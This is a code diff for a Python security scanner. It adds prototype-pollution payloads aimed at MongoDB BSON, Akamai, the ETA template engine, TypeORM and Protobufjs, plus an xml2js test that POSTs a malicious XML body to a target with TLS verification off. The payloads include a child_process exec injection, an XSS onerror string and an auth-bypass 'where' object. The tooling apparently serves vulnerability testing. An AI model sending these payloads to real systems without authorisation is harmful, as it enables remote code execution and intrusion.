@@ -3526,6 +3526,51 @@ class CompleteSecurityScanner:
                 "detection": ["dset"],
                 "severity": "MEDIUM",
             },
+            # MongoDB BSON evalFunctions RCE
+            {
+                "cve": "MongoDB BSON evalFunctions RCE",
+                "library": "MongoDB BSON",
+                "method": "deserialize",
+                "payload": '{"__proto__":{"evalFunctions":true,"$where":"require(\\\"child_process\\\").exec(\\\"id\\\")","polluted":"PPMAP_PROTO"}}',
+                "detection": ["bson", "mongodb"],
+                "severity": "CRITICAL",
+            },
+            # Akamai BoT Management XSS Gadget
+            {
+                "cve": "Akamai BoT Management XSS",
+                "library": "Akamai",
+                "method": "BoT Client-Side",
+                "payload": '{"__proto__":{"ak_bmsc":"<img src=x onerror=alert(1)><!-- PPMAP_PROTO -->"}}',
+                "detection": ["akamai", "_cf_chl_opt"],
+                "severity": "HIGH",
+            },
+            # ETA Template Engine RCE (CVE-2022-25967)
+            {
+                "cve": "CVE-2022-25967",
+                "library": "ETA Template",
+                "method": "Render",
+                "payload": '{"__proto__":{"varName":"x=console.log(1); // PPMAP_PROTO"}}',
+                "detection": ["eta"],
+                "severity": "CRITICAL",
+            },
+            # TypeORM Authentication Bypass
+            {
+                "cve": "TypeORM Auth Bypass PP",
+                "library": "TypeORM",
+                "method": "Object Parameter",
+                "payload": '{"__proto__":{"where":{"1":"1","PPMAP":"PPMAP_PROTO"}}}',
+                "detection": ["typeorm"],
+                "severity": "HIGH",
+            },
+            # Protobufjs (CVE-2023-36665)
+            {
+                "cve": "CVE-2023-36665",
+                "library": "Protobufjs (v2023)",
+                "method": "Parse",
+                "payload": '{"__proto__":{"__idic__": "PPMAP_PROTO"}}',
+                "detection": ["protobuf", "protobufjs"],
+                "severity": "HIGH",
+            },
         ]
 
         try:
@@ -3610,6 +3655,50 @@ class CompleteSecurityScanner:
                 except Exception as e:
                     logger.debug(f"CVE test error ({test['cve']}): {e}")
                     continue
+
+            # --- XML-Based Vulnerability Detection (xml2js) ---
+            try:
+                print(f"{Colors.BLUE}[→] Testing XML parsers (xml2js) for prototype pollution...{Colors.ENDC}")
+                xml_payload = "<__proto__><polluted>true</polluted></__proto__>"
+                xml_headers = {"Content-Type": "application/xml"}
+                xml_resp = self.session.post(
+                    target_url,
+                    data=xml_payload,
+                    headers=xml_headers,
+                    timeout=5,
+                    verify=False,
+                )
+                
+                if xml_resp.status_code == 500:
+                    findings.append(
+                        {
+                            "type": "cve_specific_potential",
+                            "method": "XML2JS_PARSE_ERROR",
+                            "severity": "MEDIUM",
+                            "cve": "xml2js Prototype Pollution",
+                            "library": "xml2js",
+                            "payload": xml_payload,
+                            "description": "Potential xml2js Prototype Pollution - Server error on malicious XML payload",
+                            "note": "Requires behavioral verification",
+                        }
+                    )
+                    print(f"{Colors.WARNING}[!] Potential xml2js prototype pollution (500 error){Colors.ENDC}")
+                elif "polluted" in xml_resp.text:
+                    findings.append(
+                        {
+                            "type": "cve_specific",
+                            "method": "XML2JS_POLLUTION",
+                            "severity": "HIGH",
+                            "cve": "xml2js Prototype Pollution",
+                            "library": "xml2js",
+                            "vulnerable_method": "parseString",
+                            "payload": xml_payload,
+                            "description": "XML to JSON object parsing pollution discovered via XML payload",
+                        }
+                    )
+                    print(f"{Colors.FAIL}[!] HIGH: xml2js XML prototype pollution detected!{Colors.ENDC}")
+            except Exception as e:
+                logger.debug(f"XML test error: {e}")
 
             if not findings:
                 print(
